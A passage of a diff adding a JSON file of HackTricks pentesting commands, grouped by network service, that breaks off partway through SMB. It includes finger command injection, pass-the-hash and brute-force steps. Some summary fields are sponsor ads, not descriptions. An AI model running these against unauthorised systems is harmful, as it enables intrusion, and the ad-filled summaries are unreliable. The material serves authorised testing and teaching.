@@ -1,0 +1,2049 @@
+{
+ "source": "HackTricks network-services-pentesting",
+ "license": "CC BY-NC 4.0",
+ "attribution": "HackTricks by Carlos Polop — https://github.com/carlospolop/hacktricks",
+ "services": [
+  {
+   "key": "ht-ftp",
+   "name": "FTP",
+   "ports": [
+    21
+   ],
+   "summary": "The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network.\\ It is a plain-text protocol that uses as new line character 0x0d 0x0a so sometimes you need to connect using telnet or nc -C.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT   STATE SERVICE\n21/tcp open  ftp"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing",
+     "commands": [
+      "nc -vn <IP> 21\nopenssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any"
+     ]
+    },
+    {
+     "heading": "Connect to FTP using starttls",
+     "commands": [
+      "lftp\nlftp :~> set ftp:ssl-force true\nlftp :~> set ssl:verify-certificate no\nlftp :~> connect 10.10.10.208\nlftp 10.10.10.208:~> login\nUsage: login <user|URL> [<pass>]\nlftp 10.10.10.208:~> login username Password"
+     ]
+    },
+    {
+     "heading": "Unauth enum",
+     "commands": [
+      "sudo nmap -sV -p21 -sC -A 10.10.10.10",
+      "HELP\n214-The following commands are recognized (* =>'s unimplemented):\n214-CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV\n214-EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD\n214-XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP\n214-NOOP    FEAT    OPTS    AUTH    CCC*    CONF*   ENC*    MIC*\n214-PBSZ    PROT    TYPE    STRU    MODE    RETR    STOR    STOU\n214-APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST\n214-NLST    STAT    SITE    MLSD    MLST\n214 Direct comments to root@drei.work\nFEAT\n211-Features:\n PROT\n CCC\n PBSZ\n AUTH TLS\n MFF modify;UNIX.group;UNIX.mode;\n REST STREAM\n MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;\n UTF8\n EPRT\n EPSV\n LANG en-US\n MDTM\n SSCN\n TVFS\n MFMT\n SIZE\n211 End\nSTAT\n#Info about the FTP server (version, configs, status...)"
+     ]
+    },
+    {
+     "heading": "Anonymous login",
+     "commands": [
+      "ftp <IP>\n>anonymous\n>anonymous\n>ls -a # List all files (even hidden) (yes, they could be hidden)\n>binary #Set transmission to binary instead of ascii\n>ascii #Set transmission to ascii instead of binary\n>bye #exit"
+     ]
+    },
+    {
+     "heading": "Automated",
+     "commands": [
+      "nmap --script ftp-* -p 21 <ip>"
+     ]
+    },
+    {
+     "heading": "Browser connection",
+     "commands": [
+      "ftp://anonymous:anonymous@10.10.10.98"
+     ]
+    },
+    {
+     "heading": "Download all files from FTP",
+     "commands": [
+      "wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all\nwget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-ssh-sftp",
+   "name": "SSH/SFTP",
+   "ports": [
+    22
+   ],
+   "summary": "If you are interested in hacking carer and hack the unhackable - we are hiring! (fluent polish written and spoken required).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "22/tcp open  ssh     syn-ack"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing",
+     "commands": [
+      "nc -vn <IP> 22"
+     ]
+    },
+    {
+     "heading": "Automated ssh-audit",
+     "commands": [
+      "usage: ssh-audit.py [-1246pbcnjvlt] <host>\n   -1,  --ssh1             force ssh version 1 only\n   -2,  --ssh2             force ssh version 2 only\n   -4,  --ipv4             enable IPv4 (order of precedence)\n   -6,  --ipv6             enable IPv6 (order of precedence)\n   -p,  --port=<port>      port to connect\n   -b,  --batch            batch output\n   -c,  --client-audit     starts a server on port 2222 to audit client\n                               software config (use -p to change port;\n                               use -t to change timeout)\n   -n,  --no-colors        disable colors\n   -j,  --json             JSON output\n   -v,  --verbose          verbose output\n   -l,  --level=<level>    minimum output level (info|warn|fail)\n   -t,  --timeout=<secs>   timeout (in seconds) for connection and reading\n                               (default: 5)\n$ python3 ssh-audit <IP>"
+     ]
+    },
+    {
+     "heading": "Public SSH key of server",
+     "commands": [
+      "ssh-keyscan -t rsa <IP> -p <PORT>"
+     ]
+    },
+    {
+     "heading": "Nmap scripts",
+     "commands": [
+      "nmap -p22 <ip> -sC # Send default nmap scripts for SSH\nnmap -p22 <ip> -sV # Retrieve version\nnmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms\nnmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys\nnmap -p22 <ip> --script ssh-auth-methods --script-args=\"ssh.user=root\" # Check authentication methods"
+     ]
+    },
+    {
+     "heading": "Username Enumeration",
+     "commands": [
+      "msf> use scanner/ssh/ssh_enumusers"
+     ]
+    },
+    {
+     "heading": "Private/Public Keys BF",
+     "commands": [
+      "https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html",
+      "msf> use scanner/ssh/ssh_identify_pubkeys"
+     ]
+    },
+    {
+     "heading": "SFTP command execution",
+     "commands": [
+      "$ ssh -v noraj@192.168.1.94 id\n...\nPassword:\ndebug1: Authentication succeeded (keyboard-interactive).\nAuthenticated to 192.168.1.94 ([192.168.1.94]:22).\ndebug1: channel 0: new [client-session]\ndebug1: Requesting no-more-sessions@openssh.com\ndebug1: Entering interactive session.\ndebug1: pledge: network\ndebug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0\ndebug1: Sending command: id\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\ndebug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0\nuid=1000(noraj) gid=100(users) groups=100(users)\ndebug1: channel 0: free: client-session, nchannels 1\nTransferred: sent 2412, received 2480 bytes, in 0.1 seconds\nBytes per second: sent 43133.4, received 44349.5\ndebug1: Exit status 0\n$ ssh noraj@192.168.1.94 /bin/bash",
+      "Match User noraj\n        ChrootDirectory %h\n        ForceCommand internal-sftp\n        AllowTcpForwarding no\n        PermitTunnel no\n        X11Forwarding no\n        PermitTTY no"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-telnet",
+   "name": "Telnet",
+   "ports": [
+    23
+   ],
+   "summary": "Telnet is a network protocol that gives users a UNsecure way to access a computer over a network.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-telnet.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "23/tcp open  telnet"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing",
+     "commands": [
+      "nc -vn <IP> 23",
+      "nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 <IP>"
+     ]
+    },
+    {
+     "heading": "Config file",
+     "commands": [
+      "/etc/inetd.conf\n/etc/xinetd.d/telnet\n/etc/xinetd.d/stelnet"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: Telnet    #Protocol Abbreviation if there is one.\nPort_Number:  23     #Comma separated if there is more than one.\nProtocol_Description: Telnet          #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Notes\n  Description: Notes for t=Telnet\n  Note: |\n    wireshark to hear creds being passed\n    tcp.port == 23 and ip.addr != myip\n    https://book.hacktricks.xyz/pentesting/pentesting-telnet\nEntry_2:\n  Name: Banner Grab\n  Description: Grab Telnet Banner\n  Command: nc -vn {IP} 23\nEntry_3:\n  Name: Nmap with scripts\n  Description: Run nmap scripts for telnet\n  Command: nmap -n -sV -Pn --script \"*telnet*\" -p 23 {IP}\nEntry_4:\n  Name: consoleless mfs enumeration\n  Description: Telnet enumeration without the need to run msfconsole\n  Note: sourced from https://github.com/carlospolop/legion\n  Command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit'"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-smtp-s",
+   "name": "SMTP/s",
+   "ports": [
+    25,
+    465,
+    587
+   ],
+   "summary": "SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT   STATE SERVICE REASON  VERSION\n25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing/Basic connection",
+     "commands": [
+      "nc -vn <IP> 25",
+      "openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command\nopenssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587"
+     ]
+    },
+    {
+     "heading": "Finding MX servers of an organisation",
+     "commands": [
+      "dig +short mx google.com"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "nmap -p25 --script smtp-commands 10.10.10.10\nnmap -p25 --script smtp-open-relay 10.10.10.10 -v"
+     ]
+    },
+    {
+     "heading": "NTLM Auth - Information disclosure",
+     "commands": [
+      "root@kali: telnet example.com 587\n220 example.com SMTP Server Banner\n>> HELO\n250 example.com Hello [x.x.x.x]\n>> AUTH NTLM 334\nNTLM supported\n>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=\n334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA"
+     ]
+    },
+    {
+     "heading": "Internal server name - Information disclosure",
+     "commands": [
+      "220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200\nEHLO all\n250-somedomain.com Hello [x.x.x.x]\n250-TURN\n250-SIZE 52428800\n250-ETRN\n250-PIPELINING\n250-DSN\n250-ENHANCEDSTATUSCODES\n250-8bitmime\n250-BINARYMIME\n250-CHUNKING\n250-VRFY\n250 OK\nMAIL FROM: me\n250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK"
+     ]
+    },
+    {
+     "heading": "RCPT TO",
+     "commands": [
+      "$ telnet 10.0.10.1 25\nTrying 10.0.10.1...\nConnected to 10.0.10.1.\nEscape character is '^]'.\n220 myhost ESMTP Sendmail 8.9.3\nHELO x\n250 myhost Hello [10.0.0.99], pleased to meet you\nMAIL FROM:test@test.org\n250 2.1.0 test@test.org... Sender ok\nRCPT TO:test\n550 5.1.1 test... User unknown\nRCPT TO:admin\n550 5.1.1 admin... User unknown\nRCPT TO:ed\n250 2.1.5 ed... Recipient ok"
+     ]
+    },
+    {
+     "heading": "VRFY",
+     "commands": [
+      "$ telnet 10.0.0.1 25\nTrying 10.0.0.1...\nConnected to 10.0.0.1.\nEscape character is '^]'.\n220 myhost ESMTP Sendmail 8.9.3\nHELO\n501 HELO requires domain address\nHELO x\n250 myhost Hello [10.0.0.99], pleased to meet you\nVRFY root\n250 Super-User <root@myhost>\nVRFY blah\n550 blah... User unknown"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-tacacs",
+   "name": "TACACS+",
+   "ports": [
+    49
+   ],
+   "summary": "Terminal Access Controller Access Control System (TACACS) is a security protocol that provides centralized validation of users who are attempting to gain access to a router or NAS. TACACS+, a more recent version of the original TACACS protocol, provides separate authentication, authorization, and accounting (AAA) services.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/49-pentesting-tacacs+.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT   STATE  SERVICE\n49/tcp open   tacacs"
+     ]
+    },
+    {
+     "heading": "Brute-force Key",
+     "commands": [
+      "sudo loki_gtk.py"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-dns",
+   "name": "DNS",
+   "ports": [
+    53
+   ],
+   "summary": "The Domain Name Systems (DNS) is the phonebook of the Internet. Humans access information online through domain names, like nytimes.com or espn.com. Web browsers interact through Internet Protocol (IP) addresses. DNS translates domain names to IP addresses so browsers can load Internet resources.\\",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE  REASON\n53/tcp   open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n5353/udp open  zeroconf udp-response\n53/udp   open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing",
+     "commands": [
+      "dig version.bind CHAOS TXT @DNS",
+      "--script dns-nsid"
+     ]
+    },
+    {
+     "heading": "Any record",
+     "commands": [
+      "dig any victim.com @<DNS_IP>"
+     ]
+    },
+    {
+     "heading": "Zone Transfer",
+     "commands": [
+      "dig axfr @<DNS_IP> #Try zone transfer without domain\ndig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain\nfierce --domain <DOMAIN> --dns-servers <DNS_IP> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack"
+     ]
+    },
+    {
+     "heading": "More info",
+     "commands": [
+      "dig ANY @<DNS_IP> <DOMAIN>     #Any information\ndig A @<DNS_IP> <DOMAIN>       #Regular DNS request\ndig AAAA @<DNS_IP> <DOMAIN>    #IPv6 DNS request\ndig TXT @<DNS_IP> <DOMAIN>     #Information\ndig MX @<DNS_IP> <DOMAIN>      #Emails related\ndig NS @<DNS_IP> <DOMAIN>      #DNS that resolves that name\ndig -x 192.168.0.2 @<DNS_IP>   #Reverse lookup\ndig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup\n#Use [-p PORT]  or  -6 (to use ivp6 address of dns)"
+     ]
+    },
+    {
+     "heading": "Using nslookup",
+     "commands": [
+      "nslookup\n> SERVER <IP_DNS> #Select dns server\n> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...\n> <IP_MACHINE> #Reverse lookup of a machine, maybe..."
+     ]
+    },
+    {
+     "heading": "Useful metasploit modules",
+     "commands": [
+      "auxiliary/gather/enum_dns #Perform enumeration actions"
+     ]
+    },
+    {
+     "heading": "Useful nmap scripts",
+     "commands": [
+      "#Perform enumeration actions\nnmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-finger",
+   "name": "Finger",
+   "ports": [
+    79
+   ],
+   "summary": "Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-finger.html",
+   "sections": [
+    {
+     "heading": "Basic Info",
+     "commands": [
+      "PORT   STATE SERVICE\n79/tcp open  finger"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing/Basic connection",
+     "commands": [
+      "nc -vn <IP> 79\necho \"root\" | nc -vn <IP> 79"
+     ]
+    },
+    {
+     "heading": "User enumeration",
+     "commands": [
+      "finger @<Victim>       #List users\nfinger admin@<Victim>  #Get info of user\nfinger user@<Victim>   #Get info of user",
+      "finger-user-enum.pl -U users.txt -t 10.0.0.1\nfinger-user-enum.pl -u root -t 10.0.0.1\nfinger-user-enum.pl -U users.txt -T ips.txt"
+     ]
+    },
+    {
+     "heading": "Metasploit uses more tricks than Nmap",
+     "commands": [
+      "use auxiliary/scanner/finger/finger_users"
+     ]
+    },
+    {
+     "heading": "Command execution",
+     "commands": [
+      "finger \"|/bin/id@example.com\"\nfinger \"|/bin/ls -a /@example.com\""
+     ]
+    },
+    {
+     "heading": "Finger Bounce",
+     "commands": [
+      "finger user@host@victim\nfinger @internal@external"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-web-methodology",
+   "name": "Web Methodology",
+   "ports": [
+    80,
+    443
+   ],
+   "summary": "Bug bounty tip: sign up for Intigriti, a premium bug bounty platform created by hackers, for hackers! Join us at https://go.intigriti.com/hacktricks today, and start earning bounties up to $100,000!",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web.html",
+   "sections": [
+    {
+     "heading": "Basic Info",
+     "commands": [
+      "PORT    STATE SERVICE\n80/tcp  open  http\n443/tcp open  ssl/https",
+      "nc -v domain.com 80 # GET / HTTP/1.0\nopenssl s_client -connect domain.com:443 # GET / HTTP/1.0"
+     ]
+    },
+    {
+     "heading": "Identify",
+     "commands": [
+      "whatweb -a 1 <URL> #Stealthy\nwhatweb -a 3 <URL> #Aggresive\nwebtech -u <URL>\nwebanalyze -host https://google.com -crawl 2"
+     ]
+    },
+    {
+     "heading": "General purpose automatic scanners",
+     "commands": [
+      "nikto -h <URL>\nwhatweb -a 4 <URL>\nwapiti -u <URL>\nW3af\nzaproxy #You can use an API\nnuclei -ut && nuclei -target <URL>"
+     ]
+    },
+    {
+     "heading": "CMS scanners",
+     "commands": [
+      "cmsmap [-f W] -F -d <URL>\nwpscan --force update -e --url <URL>\njoomscan --ec -u <URL>\njoomlavs.rb #https://github.com/rastating/joomlavs"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-pop",
+   "name": "POP",
+   "ports": [
+    110,
+    995
+   ],
+   "summary": "Post Office Protocol (POP) is a type of computer networking and Internet standard protocol that extracts and retrieves email from a remote mail server for access by the host machine. POP is an application layer protocol in the OSI model that provides end users the ability to fetch and receive email (from here).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n110/tcp open  pop3"
+     ]
+    },
+    {
+     "heading": "Banner Grabbing",
+     "commands": [
+      "nc -nv <IP> 110\nopenssl s_client -connect <IP>:995 -crlf -quiet"
+     ]
+    },
+    {
+     "heading": "Automated",
+     "commands": [
+      "nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port <PORT> <IP> #All are default scripts"
+     ]
+    },
+    {
+     "heading": "POP syntax",
+     "commands": [
+      "POP commands:\n  USER uid           Log in as \"uid\"\n  PASS password      Substitue \"password\" for your actual password\n  STAT               List number of messages, total mailbox size\n  LIST               List messages and sizes\n  RETR n             Show message n\n  DELE n             Mark message n for deletion\n  RSET               Undo any changes\n  QUIT               Logout (expunges messages if no RSET)\n  TOP msg n          Show first n lines of message number msg\n  CAPA               Get capabilities",
+      "root@kali:~# telnet $ip 110\n +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready\n USER billydean\n +OK\n PASS password\n +OK Welcome billydean\n list\n +OK 2 1807\n 1 786\n 2 1021\n retr 1\n +OK Message follows\n From: jamesbrown@motown.com\n Dear Billy Dean,\n Here is your login for remote desktop ... try not to forget it this time!\n username: billydean\n password: PA$$W0RD!Z"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-ident",
+   "name": "Ident",
+   "ports": [
+    113
+   ],
+   "summary": "Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.\\ Get Access Today:",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/113-pentesting-ident.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n113/tcp open  ident"
+     ]
+    },
+    {
+     "heading": "Nmap",
+     "commands": [
+      "PORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)\n|_auth-owners: root\n| ssh-hostkey:\n|   1024 88:23:98:0d:9d:8a:20:59:35:b8:14:12:14:d5:d0:44 (DSA)\n|_  2048 6b:5d:04:71:76:78:56:96:56:92:a8:02:30:73:ee:fa (RSA)\n113/tcp open  ident\n|_auth-owners: identd\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)\n|_auth-owners: root\n445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)\n|_auth-owners: root"
+     ]
+    },
+    {
+     "heading": "Ident-user-enum",
+     "commands": [
+      "root@kali:/opt/local/recon/192.168.1.100# ident-user-enum 192.168.1.100 22 113 139 445\nident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )\n192.168.1.100:22  root\n192.168.1.100:113 identd\n192.168.1.100:139 root\n192.168.1.100:445 root"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: Ident    #Protocol Abbreviation if there is one.\nPort_Number:  113     #Comma separated if there is more than one.\nProtocol_Description: Identification Protocol         #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Notes\n  Description: Notes for Ident\n  Note: |\n    Is an Internet protocol that helps identify the user of a particular TCP connection.\n    https://book.hacktricks.xyz/pentesting/113-pentesting-ident\nEntry_2:\n  Name: Enum Users\n  Description: Enumerate Users\n  Note: apt install ident-user-enum    ident-user-enum {IP} 22 23 139 445 (try all open ports)"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-msrpc",
+   "name": "MSRPC",
+   "ports": [
+    135,
+    593
+   ],
+   "summary": "Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\\ This crypto bounty alone is worth $1.000.000!\\ Check out the top-paying bounties among crypto projects.\\ Sign up on HackenProof to get rewarded without delays and become the web3 hacker legend.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "135/tcp   open     msrpc         Microsoft Windows RPC"
+     ]
+    },
+    {
+     "heading": "Identifying Exposed RPC Services",
+     "commands": [
+      "D:\\rpctools> rpcdump [-p port] 192.168.189.1\nIfId: 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc version 1.0\nAnnotation: Messenger Service\nUUID: 00000000-0000-0000-0000-000000000000\nBinding: ncadg_ip_udp:192.168.189.1[1028]",
+      "use auxiliary/scanner/dcerpc/endpoint_mapper\nuse auxiliary/scanner/dcerpc/hidden\nuse auxiliary/scanner/dcerpc/management\nuse auxiliary/scanner/dcerpc/tcp_dcerpc_auditor\nrpcdump.py <IP> -p 135"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-netbios",
+   "name": "NetBios",
+   "ports": [
+    137,
+    138,
+    139
+   ],
+   "summary": "Name service for name registration and resolution (ports: 137/udp and 137/tcp).  Datagram distribution service for connectionless communication (port: 138/udp).  Session service for connection-oriented communication (port: 139/tcp).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/137-138-139-pentesting-netbios.html",
+   "sections": [
+    {
+     "heading": "Name Service",
+     "commands": [
+      "PORT    STATE SERVICE    VERSION\n137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)",
+      "nmblookup -A <IP>\nnbtscan <IP>/30\nsudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP>"
+     ]
+    },
+    {
+     "heading": "Datagram Distribution Service",
+     "commands": [
+      "PORT    STATE         SERVICE     VERSION\n138/udp open|filtered netbios-dgm"
+     ]
+    },
+    {
+     "heading": "Session Service",
+     "commands": [
+      "PORT      STATE SERVICE      VERSION\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: Netbios    #Protocol Abbreviation if there is one.\nPort_Number:  137,138,139     #Comma separated if there is more than one.\nProtocol_Description: Netbios         #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Notes\n  Description: Notes for NetBios\n  Note: |\n    Name service for name registration and resolution (ports: 137/udp and 137/tcp).\n    Datagram distribution service for connectionless communication (port: 138/udp).\n    Session service for connection-oriented communication (port: 139/tcp).\n    Every machine should have a name inside the NetBios network. To request a name, a machine should send a \"Name Query\" packet in broadcast and if anyone answer that it is already using that name, the machine can use that name. If there is a Name Service server, the computer could ask the Name Service server if someone is using the name that it wants to use.\n    https://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios\nEntry_2:\n  Name: Find Names\n  Description: Three scans to find the names of the server\n  Command: nmblookup -A {IP} &&&& nbtscan {IP}/30 &&&& nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n {IP}"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-smb",
+   "name": "SMB",
+   "ports": [
+    139,
+    445
+   ],
+   "summary": "NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, sepa",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html",
+   "sections": [
+    {
+     "heading": "Port 139",
+     "commands": [
+      "139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn"
+     ]
+    },
+    {
+     "heading": "Port 445",
+     "commands": [
+      "445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)"
+     ]
+    },
+    {
+     "heading": "Scan a network searching for hosts:",
+     "commands": [
+      "nbtscan -r 192.168.0.1/24"
+     ]
+    },
+    {
+     "heading": "Search exploit",
+     "commands": [
+      "msf> search type:exploit platform:windows target:2008 smb\nsearchsploit microsoft smb"
+     ]
+    },
+    {
+     "heading": "Obtain Information",
+     "commands": [
+      "#Dump interesting information\nenum4linux -a [-u \"<username>\" -p \"<passwd>\"] <IP>\nenum4linux-ng -A [-u \"<username>\" -p \"<passwd>\"] <IP>\nnmap --script \"safe or smb-enum-*\" -p 445 <IP>\n#Connect to the rpc\nrpcclient -U \"\" -N <IP> #No creds\nrpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash\nrpcclient -U \"username%passwd\" <IP> #With creds\n#You can use querydispinfo and enumdomusers to query user information\n#Dump user information\n/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>\n/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>\n#Map possible RPC endpoints\n/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>\n/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>\n/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>"
+     ]
+    },
+    {
+     "heading": "List shared folders",
+     "commands": [
+      "smbclient --no-pass -L //<IP> # Null user\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\nsmbmap -H <IP> [-P <PORT>] #Null user\nsmbmap -u \"username\" -p \"password\" -H <IP> [-P <PORT>] #Creds\nsmbmap -u \"username\" -p \"<NT>:<LM>\" -H <IP> [-P <PORT>] #Pass-the-Hash\nsmbmap -R -u \"username\" -p \"password\" -H <IP> [-P <PORT>] #Recursive list\ncrackmapexec smb <IP> -u '' -p '' --shares #Null user\ncrackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user\ncrackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user"
+     ]
+    },
+    {
+     "heading": "Connect/List a shared folder",
+     "commands": [
+      "#Connect using smbclient\nsmbclient --no-pass //<IP>/<Folder>\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient\n#List with smbmap, without folder it list everything\nsmbmap [-u \"username\" -p \"password\"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list\nsmbmap [-u \"username\" -p \"password\"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list\nsmbmap -u \"username\" -p \"<NT>:<LM>\" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash"
+     ]
+    },
+    {
+     "heading": "Manually enumerate windows shares and connect to them",
+     "commands": [
+      "smbclient -U '%' -N \\\\\\\\<IP>\\\\<SHARE> # null session to connect to a windows share\nsmbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)",
